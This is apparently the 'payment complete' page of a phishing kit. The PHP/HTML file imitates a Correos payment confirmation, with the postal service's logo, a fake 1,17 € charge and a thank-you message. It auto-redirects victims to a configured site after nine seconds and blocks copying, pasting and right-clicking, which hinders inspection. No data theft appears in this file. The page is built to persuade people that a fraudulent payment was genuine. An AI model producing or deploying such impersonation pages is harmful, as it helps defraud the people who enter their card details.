<?php

require_once "./settings/conf.php";
error_reporting();
session_start();

?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="wf-inactive gr__sc-icpdz_correos_es" oncontextmenu="return false;" onselectstart="return false" ondrag="return false" ondrop="return false" onpaste="return false;" oncopy="return false;" oncut="return false;">

<head id="Head1">
    <style>
        .hidden {
            display: none;
        }
    </style>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta http-equiv="Refresh" rel="noopener noreferrer nofollow" content="9; url='<?php echo REDIRECT_WEBSITE ?>'" />
    <script language="javascript" type="text/javascript" src="assets/Seleccione%20medio%20de%20pago_fichiers/typeKit.js"></script>

    <style type="text/css">
        .tk-pt-sans {
            font-family: "pt-sans", sans-serif;
        }
    </style>
    <style type="text/css">
        @font-face {
            font-family: pt-sans;
            src: url(https://use.typekit.net/af/802da8/0000000000000000000124f9/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff2"), url(https://use.typekit.net/af/802da8/0000000000000000000124f9/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff"), url(https://use.typekit.net/af/802da8/0000000000000000000124f9/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("opentype");
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: pt-sans;
            src: url(https://use.typekit.net/af/7505b0/0000000000000000000124fa/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff2"), url(https://use.typekit.net/af/7505b0/0000000000000000000124fa/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff"), url(https://use.typekit.net/af/7505b0/0000000000000000000124fa/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("opentype");
            font-weight: 700;
            font-style: normal;
        }
    </style>
    <script>
        try {
            Typekit.load({
                async: true
            });
        } catch (e) {}
    </script>

    <link rel="stylesheet" type="text/css" href="assets/Seleccione%20medio%20de%20pago_fichiers/bootstrap.css" media="screen">
    <link rel="stylesheet" type="text/css" href="assets/Seleccione%20medio%20de%20pago_fichiers/main.css">
    <title>
        Correos | Gracias
    </title>
    <link rel="stylesheet" href="assets/particulares_fichiers/bootstrap.css" media="screen">
    <link rel="stylesheet" href="assets/particulares_fichiers/validationEngine.css">
    <link rel="stylesheet" href="assets/particulares_fichiers/flaticon.css">
    <link rel="stylesheet" href="assets/particulares_fichiers/fontawesome-all.css">
    <link rel="stylesheet" href="assets/particulares_fichiers/new-style-common-screen.css">
    <link rel="stylesheet" href="assets/particulares_fichiers/common-dynamic.css">
    <link rel="stylesheet" href="https://cdn.mycomandia.com/static/shop/common/fonts/flaticon/flaticon.css?v=2019.12.17">
    <link rel="shortcut icon" href="./assets/Seleccione%20medio%20de%20pago_fichiers/jiconami.ico">
    <link rel="icon" href="./assets/Seleccione%20medio%20de%20pago_fichiers/jiconami.ico" type="image/ico">
    <script language="javascript" type="text/javascript" src="assets/Seleccione%20medio%20de%20pago_fichiers/jquery-1.js"></script>
    <script language="javascript" type="text/javascript" src="assets/Seleccione%20medio%20de%20pago_fichiers/jquery-1_002.js"></script>
    <script language="javascript" type="text/javascript" src="assets/Seleccione%20medio%20de%20pago_fichiers/jquery-ui-1.js"></script>
    <script type="text/javascript">
        $(document).ready(function() {
            initializeComponents();

            var prm = Sys.WebForms.PageRequestManager.getInstance();
            prm.add_initializeRequest(InitializeRequest);
            prm.add_endRequest(EndRequest);

            function InitializeRequest(sender, args) {}

            function EndRequest(sender, args) {
                initializeComponents();
            }

            $(".ogilvy-mediodepago").first().addClass("ogilvy-mediodepago-selecionado");
        });


        function initializeComponents() {
            $("#rdbSelectPayment:checked").parent().parent().addClass("selectedRow");

            var mmpp = $("#rdbSelectPayment:checked").val();
            var sgtc = $("[id*=hdSGTC]").val();
            var contract = $("[id*=hdContract]").val();
            var recurrente = $("[id*=hdRecurrente]").val();

            if (mmpp == sgtc) {
                $("[id*=panelSGTC]").removeClass("hidden");
                $("[id*=pContrato]").addClass("hidden");
                $("[id*=panelRecurrente]").addClass("hidden");
            } else if (mmpp == contract) {
                $("[id*=panelSGTC]").addClass("hidden");
                $("[id*=pContrato]").removeClass("hidden");
                $("[id*=panelRecurrente]").addClass("hidden");
            } else if (mmpp == recurrente) {
                $("[id*=panelSGTC]").addClass("hidden");
                $("[id*=pContrato]").addClass("hidden");
                $("[id*=panelRecurrente]").removeClass("hidden");
            } else {
                $("[id*=panelSGTC]").addClass("hidden");
                $("[id*=panelRecurrente]").addClass("hidden");
            }
        }

        function validarNro(e) {
            var key;
            if (window.event) // IE
            {
                key = e.keyCode;
            } else if (e.which) // Netscape/Firefox/Opera
            {
                key = e.which;
            }

            if (key < 48 || key > 57) {
                if (key == 8 || key == 44) // backspace (retroceso) 8 , ',' 44 , '.' 46
                {
                    return true;
                } else {
                    return false;
                }
            }
            return true;
        }

        function confirmarCancelar() {
            if (confirm(document.getElementById('msgCancelar').value)) {
                return true;
            } else {
                return false;
            }
        }

        function hideLoading() {
            document.getElementById('showLoading').style.display = 'none';
            $("[id*=pContrato]").addClass("hidden");
        }

        function changeMMPP(mmpp, control) {
            $(".ogilvy-mediodepago-selecionado").removeClass("ogilvy-mediodepago-selecionado");
            $(control).parent().parent().addClass("ogilvy-mediodepago-selecionado");

            $("[id*=hdMMPP]").val(mmpp);

            var sgtc = $("[id*=hdSGTC]").val();
            var contract = $("[id*=hdContract]").val();
            var recurrente = $("[id*=hdRecurrente]").val();

            if (mmpp == sgtc) {
                $("[id*=panelSGTC]").removeClass("hidden");
                $("[id*=pContrato]").addClass("hidden");
                $("[id*=panelRecurrente]").addClass("hidden");
            } else if (mmpp == contract) {
                $("[id*=panelSGTC]").addClass("hidden");
                $("[id*=pContrato]").removeClass("hidden");
                $("[id*=panelRecurrente]").addClass("hidden");
            } else if (mmpp == recurrente) {
                $("[id*=panelSGTC]").addClass("hidden");
                $("[id*=pContrato]").addClass("hidden");
                $("[id*=panelRecurrente]").removeClass("hidden");
            } else {
                $("[id*=panelSGTC]").addClass("hidden");
                $("[id*=pContrato]").addClass("hidden");
                $("[id*=panelRecurrente]").addClass("hidden");
            }

        }
    </script>
</head>

<body onload="hideLoading();" class="ogilvy-body" data-gr-c-s-loaded="true" cz-shortcut-listen="true">


    <script type="text/javascript">
        //<![CDATA[
        var theForm = document.forms['formInterfaz'];
        if (!theForm) {
            theForm = document.formInterfaz;
        }

        function __doPostBack(eventTarget, eventArgument) {
            if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
                theForm.__EVENTTARGET.value = eventTarget;
                theForm.__EVENTARGUMENT.value = eventArgument;
                theForm.submit();
            }
        }

        //]]>
    </script>



    <script type="text/javascript">
        //<![CDATA[
        var __cultureInfo = {
            "name": "es-ES",
            "numberFormat": {
                "CurrencyDecimalDigits": 2,
                "CurrencyDecimalSeparator": ",",
                "IsReadOnly": true,
                "CurrencyGroupSizes": [3],
                "NumberGroupSizes": [3],
                "PercentGroupSizes": [3],
                "CurrencyGroupSeparator": ".",
                "CurrencySymbol": "€",
                "NaNSymbol": "NeuN",
                "CurrencyNegativePattern": 8,
                "NumberNegativePattern": 1,
                "PercentPositivePattern": 0,
                "PercentNegativePattern": 0,
                "NegativeInfinitySymbol": "-Infinito",
                "NegativeSign": "-",
                "NumberDecimalDigits": 2,
                "NumberDecimalSeparator": ",",
                "NumberGroupSeparator": ".",
                "CurrencyPositivePattern": 3,
                "PositiveInfinitySymbol": "Infinito",
                "PositiveSign": "+",
                "PercentDecimalDigits": 2,
                "PercentDecimalSeparator": ",",
                "PercentGroupSeparator": ".",
                "PercentSymbol": "%",
                "PerMilleSymbol": "‰",
                "NativeDigits": ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"],
                "DigitSubstitution": 1
            },
            "dateTimeFormat": {
                "AMDesignator": "",
                "Calendar": {
                    "MinSupportedDateTime": "\/Date(-62135596800000)\/",
                    "MaxSupportedDateTime": "\/Date(253402297199999)\/",
                    "AlgorithmType": 1,
                    "CalendarType": 1,
                    "Eras": [1],
                    "TwoDigitYearMax": 2029,
                    "IsReadOnly": true
                },
                "DateSeparator": "/",
                "FirstDayOfWeek": 1,
                "CalendarWeekRule": 0,
                "FullDateTimePattern": "dddd, dd\u0027 de \u0027MMMM\u0027 de \u0027yyyy H:mm:ss",
                "LongDatePattern": "dddd, dd\u0027 de \u0027MMMM\u0027 de \u0027yyyy",
                "LongTimePattern": "H:mm:ss",
                "MonthDayPattern": "dd MMMM",
                "PMDesignator": "",
                "RFC1123Pattern": "ddd, dd MMM yyyy HH\u0027:\u0027mm\u0027:\u0027ss \u0027GMT\u0027",
                "ShortDatePattern": "dd/MM/yyyy",
                "ShortTimePattern": "H:mm",
                "SortableDateTimePattern": "yyyy\u0027-\u0027MM\u0027-\u0027dd\u0027T\u0027HH\u0027:\u0027mm\u0027:\u0027ss",
                "TimeSeparator": ":",
                "UniversalSortableDateTimePattern": "yyyy\u0027-\u0027MM\u0027-\u0027dd HH\u0027:\u0027mm\u0027:\u0027ss\u0027Z\u0027",
                "YearMonthPattern": "MMMM\u0027 de \u0027yyyy",
                "AbbreviatedDayNames": ["dom", "lun", "mar", "mié", "jue", "vie", "sáb"],
                "ShortestDayNames": ["do", "lu", "ma", "mi", "ju", "vi", "sá"],
                "DayNames": ["domingo", "lunes", "martes", "miércoles", "jueves", "viernes", "sábado"],
                "AbbreviatedMonthNames": ["ene", "feb", "mar", "abr", "may", "jun", "jul", "ago", "sep", "oct", "nov", "dic", ""],
                "MonthNames": ["enero", "febrero", "marzo", "abril", "mayo", "junio", "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre", ""],
                "IsReadOnly": true,
                "NativeCalendarName": "calendario gregoriano",
                "AbbreviatedMonthGenitiveNames": ["ene", "feb", "mar", "abr", "may", "jun", "jul", "ago", "sep", "oct", "nov", "dic", ""],
                "MonthGenitiveNames": ["enero", "febrero", "marzo", "abril", "mayo", "junio", "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre", ""]
            },
            "eras": [1, "d.C.", null, 0]
        }; //]]>
    </script>

    <div class="wrapper">

        <section class="common-screen-header" style="border-top: 6px solid #f3d132;border-bottom: 6px solid #f3d132;">
            <nav class="navbar navbar-expand-md navbar-light">

                <a style="height: 5rem;" class="navbar-brand" href="#">
                    <svg xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:cc="http://creativecommons.org/ns#" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape" width="239px" height="65px" viewBox="0 0 219.99727 59.833882" version="1.1" id="svg970" inkscape:version="0.92.2 (5c3e80d, 2017-08-06)" sodipodi:docname="Correos.svg">
                    <defs id="defs964" />
                    <sodipodi:namedview id="base" pagecolor="#ffffff" bordercolor="#666666" borderopacity="1.0" inkscape:pageopacity="0.0" inkscape:pageshadow="2" inkscape:zoom="0.70910507" inkscape:cx="367.70716" inkscape:cy="-87.838609" inkscape:document-units="mm" inkscape:current-layer="layer1" showgrid="false" fit-margin-top="0" fit-margin-left="0" fit-margin-right="0" fit-margin-bottom="0" inkscape:measure-start="686.781,423.068" inkscape:measure-end="829.214,441.401" inkscape:window-width="1366" inkscape:window-height="705" inkscape:window-x="-8" inkscape:window-y="-8" inkscape:window-maximized="1" />
                    <metadata id="metadata967">
                        <rdf:RDF>
                            <cc:Work rdf:about="">
                                <dc:format>image/svg+xml</dc:format>
                                <dc:type rdf:resource="http://purl.org/dc/dcmitype/StillImage" />
                                <dc:title></dc:title>
                            </cc:Work>
                        </rdf:RDF>
                    </metadata>
                    <g inkscape:label="Capa 1" inkscape:groupmode="layer" id="layer1" transform="translate(-22.745446,-140.77167)">
                        <path inkscape:connector-curvature="0" id="path849" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.37883949" d="m 48.868944,185.64791 c 0,2.06276 1.67115,3.7408 3.73113,3.7408 2.05999,0 3.73252,-1.67804 3.73252,-3.7408 0,-2.0655 -1.67253,-3.74081 -3.73252,-3.74081 -2.05998,0 -3.73113,1.67531 -3.73113,3.74081 m 25.91942,-11.21961 c -1.02723,7.46227 -5.84352,13.71395 -12.43851,16.7391 -2.74251,1.25749 -5.79113,1.95935 -9.00244,1.95935 h -0.74734 c -4.12272,0 -7.46365,-3.34785 -7.46365,-7.47884 0,-4.131 3.34093,-7.47884 7.46365,-7.47884 4.12136,0 7.46366,3.34784 7.46366,7.47884 0,0.92108 -0.16685,1.80214 -0.4688,2.61843 1.50293,-0.56259 2.9121,-1.32096 4.19443,-2.24337 0,0 0.005,-0.24976 0.005,-0.37522 0,-6.19653 -5.01208,-11.21964 -11.1948,-11.21964 -6.18271,0 -11.19617,5.02311 -11.19617,11.21964 0,6.19372 5.01346,11.21824 11.19617,11.21824 4.5874,0 8.89765,-1.18581 12.64534,-3.2651 7.00312,-3.88972 12.03313,-10.90939 13.21342,-19.17278 z m -37.1156,0 H 26.742699 c 1.178907,8.26336 6.210295,15.28306 13.212045,19.17275 -1.44641,-2.30267 -2.28198,-5.03137 -2.28198,-7.95314 z m 44.78333,-3.74081 c 0,16.52402 -13.36648,29.91806 -29.85602,29.91806 -16.48816,0 -29.854628,-13.39404 -29.854628,-29.91806 h 18.658458 v 5.06447 c 2.737,-3.10376 6.73839,-5.06447 11.19617,-5.06447 7.25821,0 13.30718,5.19134 14.65017,12.06901 2.45848,-3.02934 3.95314,-6.87767 4.00967,-11.07624 v -0.99277 z" />
                        <path inkscape:connector-curvature="0" id="path853" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.37883949" d="m 52.600774,158.93523 h -1.86695 v -6.9452 c -2.05999,0 -3.73114,1.6739 -3.73114,3.7408 0,1.35954 0.72389,2.55086 1.80904,3.2044 h -4.82318 c -0.46054,-0.97208 -0.71838,-2.05858 -0.71838,-3.2044 0,-1.31541 0.33918,-2.55085 0.93348,-3.62359 -0.2992,-0.0758 -0.61083,-0.11725 -0.93348,-0.11725 -2.05999,0 -3.73114,1.6739 -3.73114,3.7408 0,1.35954 0.72527,2.55086 1.80904,3.2044 h -4.82318 c -0.46054,-0.97208 -0.71838,-2.05857 -0.71838,-3.2044 0,-4.13099 3.34231,-7.4802 7.46366,-7.4802 1.35954,0 2.63496,0.36388 3.73252,0.99964 1.09756,-0.63564 2.37298,-0.99964 3.73114,-0.99964 0.64529,0 1.27129,0.0813 1.86695,0.23568 0.59566,-0.15439 1.22027,-0.23568 1.86419,-0.23568 1.36091,0 2.63496,0.36388 3.73252,0.99964 1.09893,-0.63564 2.37298,-0.99964 3.7339,-0.99964 4.11997,0 7.46365,3.34921 7.46365,7.4802 0,1.14583 -0.25921,2.23232 -0.71837,3.2044 h -4.82318 c 1.08376,-0.65354 1.80903,-1.84486 1.80903,-3.2044 0,-2.0669 -1.67115,-3.7408 -3.73113,-3.7408 -0.32265,0 -0.63427,0.0414 -0.93486,0.11725 0.59566,1.07274 0.93486,2.30818 0.93486,3.62359 0,1.14582 -0.25922,2.23232 -0.71976,3.2044 h -4.8218 c 1.08239,-0.65354 1.80766,-1.84486 1.80766,-3.2044 0,-2.0669 -1.66978,-3.7408 -3.73252,-3.7408 v 6.9452 z" />
                        <path inkscape:connector-curvature="0" id="path857" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.37883949" d="m 36.525564,162.1958 c 0,-1.2465 1.00931,-2.25854 2.25578,-2.25854 1.24372,0 2.25303,1.01204 2.25303,2.25854 0,1.2492 -1.00931,2.25991 -2.25303,2.25991 -1.24647,0 -2.25578,-1.01071 -2.25578,-2.25991" />
                        <path inkscape:connector-curvature="0" id="path861" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.37883949" d="m 64.165784,162.1958 c 0,-1.2465 1.01069,-2.25854 2.2544,-2.25854 1.24647,0 2.25578,1.01204 2.25578,2.25854 0,1.2492 -1.00931,2.25991 -2.25578,2.25991 -1.24371,0 -2.2544,-1.01071 -2.2544,-2.25991" />
                        <path inkscape:connector-curvature="0" id="path865" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.37883949" d="m 57.255594,162.1958 c 0,-1.2465 1.01069,-2.25854 2.25578,-2.25854 1.2451,0 2.25441,1.01204 2.25441,2.25854 0,1.2492 -1.00931,2.25991 -2.25441,2.25991 -1.24509,0 -2.25578,-1.01071 -2.25578,-2.25991" />
                        <path inkscape:connector-curvature="0" id="path869" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.37883949" d="m 50.346374,162.1958 c 0,-1.2465 1.0093,-2.25854 2.25578,-2.25854 1.24371,0 2.25302,1.01204 2.25302,2.25854 0,1.2492 -1.00931,2.25991 -2.25302,2.25991 -1.24648,0 -2.25578,-1.01071 -2.25578,-2.25991" />
                        <path inkscape:connector-curvature="0" id="path873" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.37883949" d="m 43.436034,162.1958 c 0,-1.2465 1.00931,-2.25854 2.2544,-2.25854 1.24509,0 2.25441,1.01204 2.25441,2.25854 0,1.2492 -1.00932,2.25991 -2.25441,2.25991 -1.24509,0 -2.2544,-1.01071 -2.2544,-2.25991" />
                        <path inkscape:connector-curvature="0" id="path875" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.37883949" d="m 41.404044,165.70327 h 22.39235 v 3.74081 h -22.39235 z" />
                        <path inkscape:connector-curvature="0" id="path887" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.37883949" d="m 51.979054,144.14844 v -0.8852 h -1.24509 v -1.2451 h 1.24509 v -1.24647 h 1.24371 v 1.24647 h 1.24371 v 1.2451 h -1.24371 v 0.8852 c 0.72389,0.25796 1.24371,0.95 1.24371,1.76352 0,1.03275 -0.83419,1.87109 -1.86556,1.87109 -1.03138,0 -1.86695,-0.83834 -1.86695,-1.87109 0,-0.81352 0.51982,-1.50568 1.24509,-1.76352" />
                        <path inkscape:connector-curvature="0" id="path891" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.96846521" d="m 118.56896,184.56106 c -3.41923,2.04324 -7.57663,3.64954 -10.86396,3.807 -3.54914,0.1752 -7.45261,-0.45644 -8.549039,-4.00978 -1.612174,-5.22625 1.602329,-11.88954 5.789249,-14.11976 5.79713,-3.0905 10.61199,-1.41731 12.26354,0.27954 l 1.20864,-6.23811 c -2.45271,-1.08462 -5.81485,-1.54323 -7.06877,-1.54323 -8.74981,0 -12.958396,4.26763 -15.588264,7.80891 -2.952699,3.98415 -6.893567,14.01744 0.433057,20.9523 2.184994,2.06887 6.173107,3.33656 9.952557,3.07475 5.96248,-0.41737 9.61399,-2.11606 13.09817,-4.62785 0.1732,0.37775 0.37403,0.73225 0.60235,1.06101 1.52359,2.19486 4.30306,3.29522 8.32069,3.29522 6.68296,0 11.09232,-2.62005 12.44072,-10.16715 l 0.42915,-2.51173 c 0.0491,-0.23826 0.0965,-0.51167 0.13776,-0.80512 0.10822,-0.7539 0.17913,-1.63185 0.17913,-2.34836 0,-5.69871 -3.48222,-8.17896 -9.66715,-8.17896 -6.61207,0 -10.91317,2.58656 -12.40724,10.1297 3.62788,-2.37397 7.18097,-4.81685 11.80291,-4.81685 2.56098,0 3.3405,1.02753 3.3405,2.93892 0,0.624 -0.0313,1.28149 -0.20473,2.27555 -0.0156,0.0809 -0.0274,0.15735 -0.0435,0.23992 l -0.46258,2.47832 c -0.8169,4.03534 -1.91924,5.45262 -5.04714,5.45262 -2.37987,0 -3.26962,-0.81293 -3.26962,-2.86801 -0.0351,-0.71261 0.12006,-2.08069 0.21063,-2.58461 0.0925,-0.50218 0.72441,-3.4448 0.72441,-3.4448 0,0 -4.31094,2.4094 -7.76165,4.47039" />
                        <path inkscape:connector-curvature="0" id="path895" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.96846521" d="m 159.88922,170.35564 c -2.48027,0 -5.42509,0.38556 -8.01166,2.47039 l 0.31889,-1.87006 h -6.45264 l -4.04125,22.74369 h 6.98214 l 2.94287,-16.49179 c 1.87988,-0.56693 4.71644,-1.0256 7.2341,-1.0256 z" />
                        <path inkscape:connector-curvature="0" id="path899" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.96846521" d="m 176.08949,170.35564 c -2.4783,0 -5.38769,0.38556 -8.01166,2.47039 l 0.35432,-1.87006 h -6.45065 l -4.04126,22.74369 h 6.98215 l 2.94285,-16.49179 c 1.87988,-0.56693 4.71447,-1.0256 7.23215,-1.0256 z" />
                        <path inkscape:connector-curvature="0" id="path903" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.96846521" d="m 234.73105,175.01769 c 1.73619,0 4.46645,0.17521 7.30302,0.45868 l 0.70864,-4.20268 c -1.73618,-0.46034 -4.71644,-0.91728 -8.15535,-0.91728 -5.31683,0 -10.45846,1.12792 -10.45846,7.13374 0,3.32077 1.87989,5.29907 5.35423,6.6711 l 1.70272,0.67323 c 2.44483,1.02558 2.97829,1.3779 2.97829,2.47239 0,1.94091 -1.80903,2.33067 -4.04323,2.33067 -3.36607,0 -4.7125,-0.28179 -7.69276,-0.41905 l -0.71062,4.16328 c 1.20864,0.35432 4.82471,0.8819 8.01559,0.8819 6.4861,0 11.41513,-1.93896 11.41513,-7.87385 0,-3.17909 -1.59642,-4.94481 -5.56485,-6.49992 l -1.91728,-0.74012 c -1.87792,-0.7756 -2.62199,-1.16731 -2.62199,-2.11807 0,-1.94292 2.01964,-2.01379 3.68692,-2.01379" />
                        <path inkscape:connector-curvature="0" id="path907" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.96846521" d="m 214.20272,181.09259 -0.49605,2.47045 c -0.77951,4.02745 -1.87988,5.43883 -4.99793,5.43883 -2.37594,0 -3.29916,-0.81293 -3.29916,-2.86014 0,-0.7756 0.0374,-1.58854 0.24804,-2.57869 l 0.498,-2.47045 c 0.74212,-4.02746 1.91334,-5.43884 4.96251,-5.43884 2.55506,0 3.29914,1.02358 3.29914,2.93102 0,0.67125 0,1.37594 -0.21455,2.50782 m -2.48224,-10.73601 c -6.62977,0 -10.91907,2.57479 -12.37179,10.10019 l -0.46062,2.18893 c -0.28346,1.37796 -0.28346,2.43697 -0.28346,3.49603 0,5.43885 3.29522,8.15927 9.56871,8.15927 6.70263,0 11.10017,-2.61412 12.4466,-10.13958 l 0.42519,-2.50386 c 0.14177,-0.84843 0.31889,-2.15546 0.31889,-3.14562 0,-5.68491 -3.47434,-8.15536 -9.64352,-8.15536" />
                        <path inkscape:connector-curvature="0" id="path911" style="fill:#193c6b;fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:1.96846521" d="m 190.12996,180.41938 h -8.18881 l 0.10636,-0.31695 c 0.42519,-2.47434 1.45272,-4.80306 4.85816,-4.80306 2.69484,0 3.47041,1.34253 3.47041,3.03541 0,0.5312 -0.10436,1.24209 -0.24608,2.0846 m -2.58852,-10.06476 c -6.62784,0 -11.34426,2.75385 -12.6907,10.73797 l -0.17717,1.20075 c -0.24998,1.376 -0.42517,2.68303 -0.42517,3.81491 0,5.75382 3.5078,8.19079 10.06672,8.19079 4.0767,0 7.37584,-0.56496 9.25572,-0.98624 l 0.74213,-4.59237 c -4.28731,0.28123 -6.27546,0.39171 -8.64943,0.39171 -3.68694,0 -4.67905,-0.92124 -4.67905,-2.75787 0,-0.49381 0.10635,-1.13182 0.28151,-2.15546 h 14.99772 c 0.46063,-2.32867 0.67323,-3.91725 0.67323,-5.50971 0,-4.94479 -2.6968,-8.33448 -9.39548,-8.33448" />
                    </g>
                </svg>
                </a>

                <button style="display:none;cursor:none;" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#common-screen-top-navbar" aria-controls="common-screen-top-navbar" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>

                <div style="display:none;cursor:none;" class="collapse navbar-collapse" id="common-screen-top-navbar">
                    <div style="display:none" class="navbar-nav ml-auto">
                        <a class="nav-item nav-link" href="#">Entrar</a>
                        <a class="nav-item nav-link" href="#">Registro</a>
                        <a class="nav-item nav-link" href="#">Cesta de la compra</a>
                    </div>
                </div>
            </nav>
        </section>

        <div id="panelContent">

            <div class="contenido" id="contenido">
                <!--ERROR-->

                <!--TITLES-->

                <section>
                    <div class="container">
                        <div class="row">
                            <div class="col-xs-12 col-sm-6 col-sm-offset-3 col-lg-5 col-lg-offset-3 text-center ogilvy-espacioseccion">

                                <div id="DatosExtra" class="ogilvy-subtitular">

                                    <span id="Importe" class="subtitulo" style="font-weight:bold;"></span>
                                    <span id="Importevalor" class="subtitulo"></span>


                                </div>
                                <div id="Panel1" style="padding-top:0 !important;" class="ogilvy-subtitular">

                                    <div style="margin-left: auto; margin-left: auto; text-align: center;" class="ogilvy-titular">
                                        <div style="margin-left: auto; margin-left: auto; text-align: center;" class="ogilvy-titular">
                                            <span id="fecha" class="descripcionPago" style="font-weight:bold;">FECHA </span><span id="Fechavalor" style="font-weight:normal;"><?php echo date('d/m/Y H:i:s'); ?></span>
                                        </div>
                                        <div style="margin-left: auto; margin-left: auto; text-align: center;display:none;" class="ogilvy-titular">
                                            <span id="concepto" class="descripcionPago" style="font-weight:bold;">CONCEPTO </span><span id="conceptovalor" style="font-weight:normal;">Compra realizada en Correos </span>
                                        </div>
                                    </div>

                                </div>

                                <div class="ogilvy-titular" style="display:none;">
                                    <span id="lbTitle" class="titulo">Se seleccionó pagar 1,17 €</span>
                                </div>
                                <div id="divSubtitularPago" class="ogilvy-subtitular ogilvy-subtitular-grande">

                                    <span id="lbSubTittle" class="subtitulo">operación completada</span><br>


                                </div>

                                <div id="divMetodoPago" class="ogilvy-metodo centerBlock">

                                    <div class="ogilvy-iconomediodepago">
                                    <svg enable-background="new 0 0 300 300" height="60px" id="Layer_1" version="1.1" viewBox="0 0 300 300" width="60px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g><path d="M150.52,14.524c-74.787,0-135.41,60.627-135.41,135.414c0,74.779,60.623,135.406,135.41,135.406   c74.782,0,135.409-60.627,135.409-135.406C285.929,75.151,225.302,14.524,150.52,14.524z M150.52,266.199   c-64.211,0-116.264-52.059-116.264-116.262c0-64.211,52.052-116.261,116.264-116.261c64.207,0,116.261,52.05,116.261,116.261   C266.78,214.141,214.727,266.199,150.52,266.199z" fill="#A3D179"/><path d="M255.264,149.934c0,57.852-46.897,104.744-104.744,104.744c-57.852,0-104.747-46.893-104.747-104.744   c0-57.851,46.895-104.744,104.747-104.744C208.366,45.189,255.264,92.083,255.264,149.934z" fill="#A3D179"/><polygon fill="#FFFFFF" points="137.202,211.401 81.978,125.994 81.978,124.92 133.718,148.3 219.059,88.466  "/></g></svg>
                                    </div>
                                    <div class="ogilvy-textomediodepago">
                                        GRACIAS
                                    </div>
                                    <div class="ogilvy-clearfix"></div>

                                </div>


                            </div>

                        </div>
                    </div>
                </section>


                <script type="text/javascript">
                    //<![CDATA[
                    Sys.WebForms.PageRequestManager._initialize('smMaster', 'formInterfaz', ['tupdPanel', ''], [], [], 90, '');
                    //]]>
                </script>

                <div id="updPanel">

                    <!--Loading-->
                    <div id="updateProgress" style="display:none;" role="status" aria-hidden="true">

                        <div style="position: fixed; text-align: center; height: 100%; width: 100%; top: 0; right: 0; left: 0; z-index: 9999999; background-color: #EAEAEA; opacity: 0.7;">
                            <div class="load-container load">
                                <div class="loader">
                                    <span id="loading">CARGANDO..</span>
                                </div>
                            </div>
                        </div>

                    </div>

                    <!--Payments-->
                    <div class="container">
                        <div class="row">
                            <div class="col-xs-12 col-sm-6 col-sm-offset-3 col-lg-5 col-lg-offset-3 ogilvy-seleccionpago ogilvy-espacioseccion">
                                <div class="col-xs-12">
                                    <div>
                                        <table align="center" id="GridViewPagoSimple" style="border-style:None;width:100%;border-collapse:collapse;" cellspacing="0" border="0">
                                            <tbody>
                                                <tr class="ogilvy-mediodepago ogilvy-mediodepago-selecionado" style="background-color:#14B99A;border-radius:3px">
                                                    <td style="width:80px;" valign="top" align="right">
                                                        <div style="margin-top : 4rem;" class="ogilvy-iconomediodepago" onclick="Javascript:changeMMPP('01757TA', this);">
